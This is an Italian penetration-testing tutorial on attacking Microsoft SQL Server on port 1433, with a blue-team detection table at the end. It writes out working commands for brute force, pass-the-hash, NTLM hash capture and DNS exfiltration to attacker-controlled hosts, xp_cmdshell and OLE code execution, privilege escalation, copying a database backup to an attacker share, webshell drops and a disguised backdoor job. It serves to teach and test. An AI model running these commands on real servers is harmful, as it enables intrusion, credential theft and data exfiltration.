---
title: 'Pentesting MSSQL: Porta 1433,Enumerazione, Attacco e Payload'
slug: porta-1433-mssql
description: 'Scopri come enumerare ed entrare su MSSQL (port 1433): pentest per credenziali deboli, xp_dirtree per hash NTLM, xp_cmdshell per RCE e pivoting su linked server'
image: /mssqlù.webp
draft: false
date: 2026-02-01T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - porta-windows
  - mssql
---

# MSSQL Porta 1433: Guida Completa a Enumerazione, Exploitation e Privilege Escalation

Un server MSSQL con la porta 1433 esposta è uno dei target più redditizi in un'infrastruttura Windows: con le credenziali giuste arrivi da un semplice login a shell SYSTEM. Questa guida copre solo l'accesso diretto al database (via mssqlclient, sqsh, credenziali) — non la SQL Injection via web, che trovi nella [guida SQL Injection su MSSQL](https://hackita.it/articoli/sql-injection-mssql/).

**Cosa imparerai:**

* Come enumerare un'istanza MSSQL sulla porta 1433/1434
* Come accedere con credenziali deboli o rubate
* Come vedere database, tabelle e colonne partendo da zero
* Come capire chi sei e che privilegi hai
* Come enumerare configurazione, job, credential e stored procedure custom dell'istanza
* Come catturare hash NTLM anche senza sysadmin
* Come ottenere RCE con xp\_cmdshell e alternative più stealth
* Come muoverti tra server collegati (linked server) e verso Active Directory
* Come rilevare e difendersi da questi attacchi (lato blue team)

**Prerequisiti:**

| Cosa serve                                                  | Perché                                  |
| ----------------------------------------------------------- | --------------------------------------- |
| Accesso di rete alla porta 1433/1434                        | Senza questo non c'è nulla da enumerare |
| [Impacket](https://hackita.it/articoli/impacket) installato | Per `mssqlclient.py`                    |
| Ambiente di test autorizzato (HTB, lab, CTF)                | Ogni comando qui è didattico            |

***

## 1. Perché la porta 1433 è un target ad alto valore {#1}

MSSQL non è "solo un database": ha funzioni native che permettono di uscire dal contesto SQL ed eseguire comandi sul sistema operativo sottostante. Un accesso anche a basso privilegio spesso porta a shell SYSTEM.

| Funzionalità                 | Cosa fa                                               | Privilegi richiesti        |
| ---------------------------- | ----------------------------------------------------- | -------------------------- |
| `xp_cmdshell`                | Esegue comandi OS                                     | sysadmin                   |
| `xp_dirtree` / `xp_subdirs`  | Forza connessione SMB → hash NTLMv2                   | Basso, spesso pubblico     |
| Linked Server                | Lateral movement tra istanze SQL, anche cross-dominio | Variabile                  |
| `sp_execute_external_script` | Esegue Python/R sul server                            | Config abilitata           |
| `OPENROWSET BULK`            | Legge file dal filesystem                             | ADMINISTER BULK OPERATIONS |
| `xp_regread`                 | Legge il registro di Windows                          | sysadmin                   |
| CLR Assembly (UDF custom)    | Carica una DLL .NET come funzione SQL                 | accesso `dbo`              |

***

## 2. Enumerazione: Nmap e SQL Browser Service {#2}

La porta **1433/TCP** ospita l'istanza MSSQL di default. La porta **1434/UDP** è il SQL Browser Service, che risponde con le istanze *named* — installazioni secondarie su porte dinamiche non prevedibili.

```bash
# Scan base con script MSSQL
nmap -sV -sC -p 1433 10.10.10.15

# Scan completo con tutti gli script ms-sql
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,\
ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes \
-p 1433 10.10.10.15

# SQL Browser per scoprire istanze named
nmap -sU -p 1434 10.10.10.15
```

**Output atteso:**

```
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.0.4375.4
| ms-sql-ntlm-info:
|   Target_Name: CORP
|   NetBIOS_Domain_Name: CORP
|   NetBIOS_Computer_Name: SQL01
|   DNS_Domain_Name: corp.local
```

Da qui hai già versione, dominio e hostname — dati utili per il resto della catena.

> Se conosci il nome dell'organizzazione, uno shodan dork come `Microsoft SQL Server` ti dice quante istanze MSSQL sono esposte pubblicamente — utile in ricognizione OSINT, mai da usare contro target non autorizzati.

***

## 3. Accesso: Credenziali, Brute Force e Connessione {#3}

### Credenziali di default da provare per prime

| Username | Password        | Note                             |
| -------- | --------------- | -------------------------------- |
| `sa`     | (vuota)         | Default su installazioni datate  |
| `sa`     | `sa`            | Classica                         |
| `sa`     | `Password123`   | Policy minima comune             |
| `sa`     | nome del server | Frequente in ambienti enterprise |

### Brute force

```bash
# nxc / CrackMapExec — SQL auth
nxc mssql 10.10.10.15 -u sa -p passwords.txt

# Windows auth (dominio)
nxc mssql 10.10.10.15 -u users.txt -p 'Password123' -d corp.local

# Pass-the-hash
nxc mssql 10.10.10.15 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:hash

# nmap brute
nmap -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt 10.10.10.15
```

**Output (creds valide):**

```
MSSQL 10.10.10.15 1433 SQL01 [+] CORP\sa:Password123 (Pwn3d!)
```

`(Pwn3d!)` conferma sysadmin.

### Connessione

```bash
# SQL auth
mssqlclient.py sa:Password123@10.10.10.15

# Windows auth
mssqlclient.py -windows-auth CORP/user:pass@10.10.10.15

# Pass-the-hash
mssqlclient.py -windows-auth CORP/user@10.10.10.15 -hashes aad3b435b51404eeaad3b435b51404ee:HASH

# sqsh (alternativa)
sqsh -S 10.10.10.15 -U sa -P Password123
```

Una volta dentro `mssqlclient.py`, sei in una shell SQL interattiva: da qui in poi tutti i comandi delle sezioni seguenti si digitano lì dentro.

***

## 4. Le Basi: Vedere Database, Tabelle e Colonne {#4}

Se non hai mai usato MSSQL, parti da qui — un passo alla volta, senza saltare.

### Passo 1 — Chi sei e su cosa sei collegato

```sql
SELECT @@VERSION;
SELECT SYSTEM_USER;
SELECT DB_NAME();
```

`DB_NAME()` ti dice su quale database sei atterrato per default (di solito `master`).

### Passo 2 — Vedere tutti i database esistenti

```sql
SELECT name FROM sys.databases;
```

Alternativa più compatibile con versioni vecchie:

```sql
SELECT name FROM master.dbo.sysdatabases;
```

Output tipo:

```
master
tempdb
model
msdb
financial_planner
```

I primi quattro sono database di sistema (li vedi in dettaglio nella sezione 6). `financial_planner` è il database dell'applicazione — quello che ti interessa.

### Passo 3 — Spostarti su un database specifico

```sql
USE financial_planner;
```

Da questo momento le query "senza prefisso" lavorano su questo database.

### Passo 4 — Vedere le tabelle di quel database

```sql
SELECT table_name FROM information_schema.tables;
```

Alternativa (funziona anche su versioni datate):

```sql
SELECT name FROM sysobjects WHERE xtype='U';
```

`xtype='U'` significa "user table" — esclude viste e tabelle di sistema.

Output:

```
users
accounts
transactions
```

### Passo 5 — Vedere le colonne di una tabella specifica

```sql
SELECT column_name FROM information_schema.columns WHERE table_name='users';
```

Output:

```
id
username
password_hash
email
is_admin
created_at
```

### Passo 6 — Vedere i dati

```sql
SELECT * FROM users;
```

Oppure solo le colonne che ti interessano:

```sql
SELECT username, password_hash FROM users;
```

> **Errore tipico:** dimenticare `USE database;` prima di interrogare le tabelle — se salti questo passo, la query cerca la tabella nel database sbagliato e ottieni "Invalid object name".

***

## 5. Chi Sono? Enumerazione di Utente e Privilegi {#5}

Prima di cercare exploit, capisci con che permessi stai lavorando: la stessa tecnica su un utente `sysadmin` e su uno `public` produce risultati completamente diversi.

```sql
-- Sei sysadmin?
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Tutti i tuoi permessi a livello server
SELECT * FROM fn_my_permissions(NULL,'SERVER');

-- Chi altro è sysadmin sul server
SELECT name FROM master.sys.server_principals WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;

-- Lista di tutti i login
SELECT name FROM sys.server_principals WHERE type IN ('S','U');
```

`IS_SRVROLEMEMBER` ritorna `1` (true) o `0` (false) — mai testo.

### Tipi di utenti MSSQL

| Tipo          | Descrizione                                                   |
| ------------- | ------------------------------------------------------------- |
| SQL Login     | Autenticazione con username/password gestita dal DB           |
| Windows Login | Autenticazione tramite account di dominio/locale              |
| Database User | Mappato a un login, ha permessi solo su un database specifico |
| sysadmin      | Ruolo server con controllo completo sull'istanza              |
| public        | Ruolo di default, minimo privilegio                           |

***

## 6. Database di Sistema: Cosa Ignorare {#6}

Quando enumeri i database, questi quattro sono sempre presenti e raramente contengono dati utili per l'attacco — concentrati sul resto.

| Nome     | Cosa contiene                                                           |
| -------- | ----------------------------------------------------------------------- |
| `master` | Configurazione a livello di istanza, login, tutti i database registrati |
| `msdb`   | Job schedulati e alert dello SQL Server Agent                           |
| `model`  | Template usato per creare ogni nuovo database                           |
| `tempdb` | Spazio di lavoro temporaneo, si svuota al riavvio                       |

`msdb` in particolare vale un controllo: se hai permessi di scrittura sui job SQL Server Agent, puoi far eseguire comandi da un account diverso (spesso più privilegiato) da quello con cui sei connesso.

```sql
-- Vedi i job configurati
SELECT name, enabled FROM msdb.dbo.sysjobs;
```

***

## 7. Enumerazione Approfondita dell'Istanza {#7}

Prima di lanciarti su hash capture o RCE, un pentester esperto passa qualche minuto a mappare com'è configurata l'istanza e cosa contiene: spesso qui dentro trovi già credenziali o vie dirette a sysadmin, senza bisogno di exploit.

### Configurazione del server

Ogni funzione avanzata di MSSQL (xp\_cmdshell, CLR, script esterni...) è on/off tramite `sp_configure`. Guardarla subito ti dice cosa è già disponibile senza doverlo abilitare tu — e se qualcosa è già acceso, probabilmente lo usa l'applicazione stessa.

```sql
SELECT name, value, value_in_use, description FROM sys.configurations;
-- Oppure, forma classica equivalente
EXEC sp_configure;
```

Cerca in particolare: `xp_cmdshell`, `Ole Automation Procedures`, `clr enabled`, `external scripts enabled`, `remote access`, `Ad Hoc Distributed Queries`, `contained database authentication`.

### Proprietari e Trustworthy dei database

Nella sezione 11 trovi come sfruttare un database `trustworthy` per la privesc — ma prima devi sapere quali database lo sono e chi li possiede, altrimenti stai cercando alla cieca.

```sql
SELECT name, SUSER_SNAME(owner_sid) AS owner, is_trustworthy_on FROM sys.databases;
```

Se `owner` è `sa` (o un altro sysadmin) e `is_trustworthy_on = 1`, quel database è un bersaglio prioritario per la privesc via stored procedure.

### Database Mail

Il sottosistema di invio email di MSSQL salva spesso credenziali SMTP in chiaro o cifrate debolmente — vale sempre un controllo.

```sql
EXEC msdb.dbo.sysmail_help_account_sp;
EXEC msdb.dbo.sysmail_help_profile_sp;
SELECT * FROM msdb.dbo.sysmail_account;
```

Se trovi un account configurato, spesso la password è riusata anche altrove (dominio, altri servizi).

### SQL Server Agent: job, step e operatori

Hai già visto come creare un job per la persistenza (sezione 14) — ma un'istanza reale ha quasi sempre job già esistenti, e leggerli ti dice sotto quale account girano e se contengono script sfruttabili.

```sql
SELECT job_id, name, enabled FROM msdb.dbo.sysjobs;
SELECT step_name, command, database_name FROM msdb.dbo.sysjobsteps;
SELECT * FROM msdb.dbo.sysoperators;
```

I job spesso girano con un account di servizio più privilegiato di quello con cui sei connesso — se puoi modificarne uno, quello step diventa la tua via verso quel privilegio.

### Credential, Proxy ed External Data Source

Oltre ai linked server (sezione 12), MSSQL può salvare credenziali per l'accesso a risorse esterne (cloud storage, proxy per l'Agent) tramite oggetti `CREDENTIAL`.

```sql
SELECT * FROM sys.credentials;
SELECT * FROM msdb.dbo.sysproxies;
```

### Login Trigger

Un trigger di login esegue codice ogni volta che qualcuno si connette — utile da conoscere sia per capire comportamenti anomali (blocchi di connessione inspiegabili) sia perché può rivelare logica di sicurezza custom dell'azienda.

```sql
SELECT * FROM sys.server_triggers;
```

### Endpoint e Service Broker

Gli endpoint espongono funzionalità di rete aggiuntive oltre alla connessione TDS standard (database mirroring, Service Broker) — utile per capire se l'istanza ha altre porte o canali di comunicazione oltre alla 1433.

```sql
SELECT * FROM sys.endpoints;
SELECT * FROM sys.services;
SELECT * FROM sys.service_queues;
```

Il Service Broker in particolare è comune in ambienti enterprise per la messaggistica asincrona tra applicazioni — se lo trovi configurato, può essere un canale di comunicazione tra sistemi che non conoscevi.

### Certificati e chiavi

MSSQL usa certificati e chiavi simmetriche per cifrare dati sensibili a livello di colonna o per firmare oggetti — sapere cosa esiste ti dice se ci sono dati cifrati che varrebbe la pena decifrare (fuori dallo scope di questo articolo, ma da segnare).

```sql
SELECT * FROM sys.certificates;
SELECT * FROM sys.symmetric_keys;
```

### Assembly CLR già presenti

Prima di crearne uno tuo (sezione 9), controlla se l'applicazione ne ha già caricati: a volte un assembly esistente ha già funzionalità che puoi riusare senza dover passare da `dbo`.

```sql
SELECT * FROM sys.assemblies;
```

### Trigger sulle tabelle

Molte applicazioni collegano logiche di business (o di sicurezza) ai trigger sulle tabelle — leggerli ti dice cosa succede "dietro le quinte" quando inserisci o modifichi dati, utile anche per capire se la tua attività lascia tracce extra.

```sql
SELECT * FROM sys.triggers;
```

### View e Stored Procedure custom

Questa è probabilmente la parte più redditizia di tutta l'enumerazione: le applicazioni aziendali quasi sempre aggiungono stored procedure custom per operazioni interne (reset password, sync utenti AD, backup, import dati) — spesso girano con permessi elevati e sono pensate per essere chiamate solo dall'app, non testate contro un attaccante.

```sql
-- View: spesso espongono join già pronti su dati sensibili
SELECT * FROM INFORMATION_SCHEMA.VIEWS;
SELECT * FROM sys.views;

-- Stored procedure custom (non quelle di sistema)
SELECT name FROM sys.procedures;
SELECT name FROM sys.objects WHERE type='P';

-- Function custom
SELECT name FROM sys.objects WHERE type='FN';
```

Una volta trovata una procedure con un nome interessante (es. `sp_ResetPassword`, `sp_SyncADUsers`), guarda il suo codice:

```sql
EXEC sp_helptext 'NomeProcedure';
```

### Ricerca automatica di dati sensibili

Invece di controllare tabella per tabella, cerca direttamente colonne con nomi sospetti in tutto il database — è quello che fa quasi ogni pentester prima di dumpare a mano.

```sql
SELECT table_name, column_name FROM information_schema.columns
WHERE column_name LIKE '%password%' OR column_name LIKE '%pwd%'
   OR column_name LIKE '%hash%' OR column_name LIKE '%secret%'
   OR column_name LIKE '%token%' OR column_name LIKE '%apikey%'
   OR column_name LIKE '%key%' OR column_name LIKE '%mail%'
   OR column_name LIKE '%username%' OR column_name LIKE '%ssn%'
   OR column_name LIKE '%iban%';
```

***

## 8. Hash Capture via xp\_dirtree {#8}

Il vettore più sottovalutato di MSSQL — e uno dei più potenti, perché quasi mai richiede sysadmin.

**Perché funziona:** forzi il servizio MSSQL a fare una richiesta SMB verso un host che controlli tu. Il service account SQL si autentica automaticamente contro quell'host, e tu catturi il suo hash NTLMv2.

```bash
# Avvia PRIMA di lanciare il payload SQL
sudo responder -I tun0 -v
```

Se non conosci ancora lo strumento, trovi la guida completa su [Responder](https://hackita.it/articoli/responder).

```sql
EXEC master.dbo.xp_dirtree '\\10.10.14.123\share';
-- Alternative se xp_dirtree è bloccato
EXEC master..xp_subdirs '\\10.10.14.123\share';
EXEC master..xp_fileexist '\\10.10.14.123\share\file';
```

**Output Responder:**

```
[SMB] NTLMv2-SSP Hash: svc_sql::CORP:a1b2c3d4:e5f6a7b8...
```

Cracca con `hashcat -m 5600 hash.txt rockyou.txt`.

> **Attenzione:** se l'username dell'hash termina con `$` (es. `CORP\SQL01$`) è un account macchina — password casuale di 120 caratteri, non craccabile. In quel caso passa a un relay con [ntlmrelayx.py](https://hackita.it/articoli/impacket).

Verifica chi ha i permessi per usarlo (utile anche come utente non-sysadmin):

```sql
Use master; EXEC sp_helprotect 'xp_dirtree';
Use master; EXEC sp_helprotect 'xp_subdirs';
```

### Alternativa quando SMB è bloccato in uscita: esfiltrazione via DNS

Se il firewall blocca il traffico SMB (445) in uscita ma non il DNS, puoi comunque far uscire dati usando funzioni che risolvono un nome di dominio contenente il dato che vuoi esfiltrare. Richiede permesso `VIEW SERVER STATE` (o `CONTROL SERVER` per la seconda variante):

```sql
-- Il subdomain risolto arriva al tuo server DNS/Burp Collaborator con il dato incluso
SELECT * FROM fn_xe_file_target_read_file('C:\*.xel','\\'+(SELECT TOP 1 name FROM sys.databases)+'.tuosubdominio.burpcollaborator.net\1.xem',null,null);
```

Utile in ambienti con EDR aggressivo sul traffico SMB, dove xp\_dirtree verrebbe bloccato o segnalato subito.

***

## 9. RCE con xp\_cmdshell e Metodi Alternativi {#9}

### xp\_cmdshell (richiede sysadmin)

```sql
-- Verifica lo stato attuale
SELECT name, value, value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';

-- Abilita
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Esegui
EXEC master..xp_cmdshell 'whoami';
EXEC master..xp_cmdshell 'whoami /priv';
EXEC master..xp_cmdshell 'net user /domain';

-- Disabilita dopo l'uso (OPSEC)
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
```

`xp_cmdshell` genera un processo figlio di `sqlservr.exe` — la maggior parte degli EDR lo monitora attivamente.

### Metodi alternativi — meno rumore

**OLE Automation** (non richiede la creazione di un processo diretto visibile come xp\_cmdshell):

```sql
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUT;
EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd.exe /c whoami > C:\Windows\Temp\out.txt';
```

**Python o R** (girano come un service account diverso da xp\_cmdshell):

```sql
EXECUTE sp_execute_external_script @language=N'Python',
  @script=N'print(__import__("os").system("whoami"))';
```

**CLR Assembly** (richiede accesso `dbo`, il più stealth ma il più complesso da preparare — carica una DLL .NET personalizzata come funzione SQL):

```sql
CREATE ASSEMBLY MyAssembly FROM 0x4D5A9000...
CREATE FUNCTION dbo.RunCmd(@cmd NVARCHAR(MAX)) RETURNS NVARCHAR(MAX)
AS EXTERNAL NAME MyAssembly.[StoredProcedures].RunCmd;
```

### Da service account a SYSTEM — SeImpersonatePrivilege

Il service account con cui gira MSSQL ha quasi sempre il privilegio token `SeImpersonatePrivilege` abilitato. Se sei già arrivato a una shell OS (via xp\_cmdshell o altro), verificalo e sfruttalo per salire a SYSTEM:

```sql
EXEC xp_cmdshell 'whoami /priv';
```

Se `SeImpersonatePrivilege` compare come `Enabled`, usa uno dei Potato attack:

```bash
GodPotato.exe -cmd "cmd /c whoami"
PrintSpoofer.exe -c "cmd /c whoami"
```

Alternative equivalenti: `RoguePotato`, `SharpEfsPotato`.

***

## 10. Lettura File e Registro di Windows {#10}

```sql
-- Lettura file (richiede ADMINISTER BULK OPERATIONS)
SELECT * FROM OPENROWSET(BULK N'C:\Windows\win.ini', SINGLE_CLOB) AS Contents;
SELECT * FROM OPENROWSET(BULK N'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS Contents;

-- Registro di Windows
EXECUTE master.sys.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion','ProductName';
EXECUTE master.sys.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Services\MSSQLSERVER','ObjectName';
```

L'ultimo comando ti dice con quale account Windows gira il servizio MSSQL — informazione utile prima di un lateral movement.

### Scrivere file sul filesystem

Se hai una stored procedure custom di scrittura file (comune in applicazioni che generano report o log), puoi usarla per depositare una webshell o un payload:

```sql
EXEC spWriteStringToFile 'contenuto', 'C:\inetpub\wwwroot\', 'shell.aspx';
```

Non è una funzione nativa di MSSQL: dipende dall'applicazione — cercala nell'enumerazione delle stored procedure custom (sezione 7).

***

## 11. Privilege Escalation Interna {#11}

### Impersonation

Se un login ha permesso `IMPERSONATE` su un altro login più privilegiato, puoi diventare quell'utente senza conoscerne la password.

```sql
-- Chi posso impersonare?
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id
WHERE a.permission_name='IMPERSONATE';

-- Impersona sa
EXECUTE AS LOGIN='sa';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Torna al tuo utente originale
REVERT;
```

### Da db\_owner a sysadmin (database Trustworthy)

Se sei `db_owner` di un database con `is_trustworthy_on = 1` e il proprietario del database è un login sysadmin (spesso `sa`), puoi creare una stored procedure che eredita quel contesto.

```sql
-- Trova database trustworthy
SELECT name, is_trustworthy_on FROM sys.databases WHERE is_trustworthy_on = 1;

-- Verifica se sei db_owner sul DB trovato
USE NomeDB;
SELECT IS_ROLEMEMBER('db_owner');

-- Crea la stored procedure che esegue come proprietario
CREATE PROCEDURE sp_elevate WITH EXECUTE AS OWNER AS
EXEC sp_addsrvrolemember 'TUO_UTENTE','sysadmin';

EXEC sp_elevate;
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Pulizia OPSEC
DROP PROCEDURE sp_elevate;
```

### Estrarre gli hash dei login SQL (richiede sysadmin)

Se sei sysadmin, puoi dumpare direttamente gli hash delle password dei login SQL — utili per movimento laterale se riusati su altri servizi. Il formato cambia in base alla versione dell'istanza, quindi verifica prima con `SELECT @@VERSION;`:

```sql
-- MSSQL 2005+ (hashcat mode 132)
SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) FROM master.sys.sql_logins;

-- MSSQL 2000 (tabella diversa, hashcat mode 131)
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins;
```

Cracca con `hashcat -m 1731 hashes.txt rockyou.txt` (MSSQL 2012+, algoritmo cambiato), `-m 132` per 2005-2008, `-m 131` per 2000. Approfondisci l'uso di [hashcat](https://hackita.it/articoli/hashcat) per scegliere la modalità giusta.

***

## 12. Linked Server: Lateral Movement e Password Recovery {#12}

I linked server collegano istanze MSSQL tra loro, anche cross-dominio. L'idea operativa: puoi avere accesso limitato su SQL01, ma SQL01 è configurato per connettersi a SQL02 con un account più privilegiato — ogni hop può portarti a sysadmin su un server diverso senza credenziali dirette.

```sql
-- Lista linked server
SELECT name, data_source FROM sys.servers WHERE is_linked=1;
EXEC sp_linkedservers;

-- Chi sei sul server remoto?
EXEC ('SELECT SYSTEM_USER') AT [SERVER_COLLEGATO];
EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [SERVER_COLLEGATO];

-- Verifica il mapping delle credenziali usate per collegarsi
EXEC sp_helplinkedsrvlogin;

-- RCE se sei sysadmin sul remoto
EXEC ('EXEC sp_configure ''xp_cmdshell'',1;RECONFIGURE;') AT [SERVER_COLLEGATO];
EXEC ('EXEC xp_cmdshell ''whoami''') AT [SERVER_COLLEGATO];
```

Con `impacket-mssqlclient`:

```bash
mssqlclient.py -windows-auth CORP/user:pass@SQLHOST
enum_links
use_link [NOME]
```

Con **MSSqlPwner** (attraversa catene di link automaticamente e supporta anche NTLM relay attraverso di essi):

```bash
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth get-link-server-list
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250
```

### Estrarre le password salvate dei linked server

**Metodo classico (richiede sysadmin + Administrator locale):** le credenziali dei linked server sono salvate cifrate in `master.sys.syslnklgns`, cifrate con la Service Master Key (DPAPI). Servono una connessione DAC (Dedicated Administrator Connection, di norma solo locale) e un trace flag (`-T7806`) per accedervi. Con questi requisiti uno script PowerShell come `Get-MSSQLLinkPasswords` decifra le credenziali in chiaro — la tecnica originale è descritta nel [blog di NetSPI su questo attacco](https://www.netspi.com/blog/technical-blog/adversary-simulation/decrypting-mssql-database-link-server-passwords/).

**Metodo ADSI (nessun privilegio amministrativo richiesto, sfruttabile anche da SQL Injection):** se colleghi un linked server al provider ADSI verso un dominio, il bind LDAP verso di esso avviene in chiaro. Puntando l'URL LDAP verso un host che controlli tu, catturi la password del linked login o della sessione corrente senza bisogno di DAC né di accesso amministrativo alla macchina.

### Pivoting quando solo la porta 1433 è raggiungibile: mssqlproxy

Scenario da ambiente enterprise segmentato: sei sysadmin sull'istanza, ma il firewall lascia passare solo traffico verso la 1433 — niente reverse shell, niente xp\_cmdshell utile verso l'esterno. `mssqlproxy` risolve il problema riusando la connessione TCP già aperta tra te e il DB per farla diventare un tunnel SOCKS5, senza aprire nuove porte né nuove connessioni in uscita.

**Come funziona:** carica una CLR assembly sul server che "recupera" (socket reuse) l'handle della tua stessa connessione TDS e ci fa passare dentro il traffico SOCKS, invece di aprirne una nuova che il firewall bloccherebbe.

```bash
# Client (richiede impacket + sysadmin sul server)
git clone https://github.com/blackarrowsec/mssqlproxy
python3 mssqlproxy.py -q sa:pass@10.10.10.15

# Dentro la shell del tool:
SQL> enable_ole
SQL> upload reciclador.dll C:\windows\temp\reciclador.dll
SQL> proxy
```

Il tunnel apre un listener locale (es. porta 1337) che puoi usare con `proxychains` per instradare qualunque altro tool (evil-winrm, altri client SQL, RDP) attraverso il server compromesso, verso host altrimenti irraggiungibili.

> **Attenzione:** interrompi sempre il proxy con `Ctrl+C` dal client — se la sessione muore in modo anomalo il servizio MSSQL può crashare e richiedere un riavvio manuale.

***

## 13. Active Directory e Kerberoasting da MSSQL {#13}

Se il server è joined al dominio, puoi enumerare [Active Directory](https://hackita.it/articoli/active-directory) direttamente dal DB.

```sql
SELECT DEFAULT_DOMAIN();
```

Il service account MSSQL quasi sempre ha un SPN (`MSSQLSvc/hostname:1433`) — è [Kerberoastable](https://hackita.it/articoli/kerberos) per design:

```bash
GetUserSPNs.py corp.local/user:pass -dc-ip 10.10.10.10 -request | grep MSSQL
hashcat -m 13100 tgs_hash.txt rockyou.txt
```

```sql
-- Con xp_cmdshell abilitato
EXEC xp_cmdshell 'net user /domain';
EXEC xp_cmdshell 'net group "Domain Admins" /domain';
EXEC xp_cmdshell 'nltest /domain_trusts';
```

### Movimento laterale verso altri host del dominio

Con xp\_cmdshell abilitato puoi usare il server MSSQL come punto di lancio verso altre macchine del dominio, se il service account ha le credenziali per farlo:

```sql
EXEC xp_cmdshell 'net view \\altro-host';
EXEC xp_cmdshell 'psexec \\altro-host -u domain\admin -p password cmd.exe';
EXEC xp_cmdshell 'wmic /node:altro-host process call create "cmd.exe /c payload.exe"';
```

### Esfiltrazione dati

```sql
-- Backup del DB su una share raggiungibile
BACKUP DATABASE NomeDB TO DISK = 'C:\Temp\backup.bak';
EXEC xp_cmdshell 'copy C:\Temp\backup.bak \\10.10.14.123\share\backup.bak';

-- Export mirato di una tabella con bcp
EXEC master..xp_cmdshell 'bcp "SELECT * FROM NomeDB.dbo.users" queryout "C:\users.txt" -c -T';
```

***

## 14. Persistenza {#14}

```sql
-- Crea un login SQL con permessi sysadmin
CREATE LOGIN backdoor WITH PASSWORD = 'P@ssw0rd123!';
EXEC sp_addsrvrolemember 'backdoor', 'sysadmin';

-- Job SQL Server Agent che esegue comandi a intervalli (msdb)
EXEC msdb.dbo.sp_add_job @job_name = 'WindowsUpdateCheck';
EXEC msdb.dbo.sp_add_jobstep @job_name = 'WindowsUpdateCheck',
  @command = 'EXEC master..xp_cmdshell ''whoami''';
```

Un job in `msdb` camuffato con un nome plausibile passa spesso inosservato in un audit veloce.

***

## 15. Detection e Difesa {#15}

Ogni tecnica sopra ha una controparte difensiva concreta.

| Attacco                           | Come rilevarlo                                                             | Come mitigarlo                                                                     |
| --------------------------------- | -------------------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
| Brute force / credenziali default | Alert su login falliti ripetuti nel SQL Server Audit Log                   | Disabilita `sa`, policy password forte, MFA dove possibile                         |
| `xp_dirtree` per hash capture     | Traffico SMB in uscita anomalo verso IP esterni                            | Blocca SMB in uscita a livello firewall, disabilita `xp_dirtree` se non serve      |
| `xp_cmdshell`                     | Processo `cmd.exe`/`powershell.exe` figlio di `sqlservr.exe`               | Disabilita xp\_cmdshell se non necessario; EDR con regola su questo parent-child   |
| OLE Automation / Python script    | Enumerazione config `sp_configure` seguita da esecuzione anomala           | Disabilita `Ole Automation Procedures` e `sp_execute_external_script` se non usati |
| Impersonation abuse               | Query su `sys.server_permissions` seguite da `EXECUTE AS LOGIN` verso `sa` | Audit periodico su chi ha `IMPERSONATE`, principio del minimo privilegio           |
| Linked server pivoting            | Query `OPENQUERY`/`EXEC ... AT` verso server esterni non abituali          | Rimuovi linked server non necessari, usa mapping con account a basso privilegio    |
| Persistenza via job SQL Agent     | Job con nomi generici creati fuori orario, comandi xp\_cmdshell nello step | Audit periodico su `msdb.dbo.sysjobs`, alerting su creazione job                   |

> **Trucco OPSEC lato attaccante (utile da conoscere anche in difesa):** aggiungendo `sp_password` in coda a una query, SQL Server sostituisce automaticamente il testo della query nei log con un placeholder generico, per evitare che password finiscano nei log in chiaro. Un attaccante può abusarne per nascondere un payload dai log — un blue team dovrebbe quindi diffidare di eventi con testo oscurato senza una password apparente nella query.

***

## 16. Tool Completo {#16}

| Tool                     | Uso                                            | Comando base                                                                 |
| ------------------------ | ---------------------------------------------- | ---------------------------------------------------------------------------- |
| **impacket-mssqlclient** | Shell interattiva                              | `mssqlclient.py sa:pass@IP`                                                  |
| **nxc / CrackMapExec**   | Brute force, enum, exec                        | `nxc mssql IP -u sa -p pass`                                                 |
| **Responder**            | Hash capture                                   | `responder -I tun0`                                                          |
| **sqsh**                 | Client alternativo                             | `sqsh -S IP -U user -P pass`                                                 |
| **PowerUpSQL**           | Toolkit di audit completo (Windows)            | `Invoke-SQLOSCmd -Username sa -Password pass -Instance HOST -Command whoami` |
| **MSSqlPwner**           | Attraversa catene di linked server, relay NTLM | `mssqlpwner corp.com/user:pass@IP -windows-auth interactive`                 |
| **mssqlproxy**           | Trasforma il DB in un tunnel SOCKS5 (pivoting) | `mssqlproxy.py -q sa:pass@IP`                                                |
| **Metasploit**           | Moduli MSSQL                                   | `use auxiliary/admin/mssql/mssql_enum`                                       |

**PowerUpSQL — enumerazione da un host di dominio già Windows-authenticated:**

```powershell
Get-SQLInstanceDomain | Get-SQLDatabase
Get-SQLInstanceDomain | Get-SQLTable -DatabaseName DBName
Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName DBName -TableName TableName
Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords "username,password" -SampleSize 10
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"
```

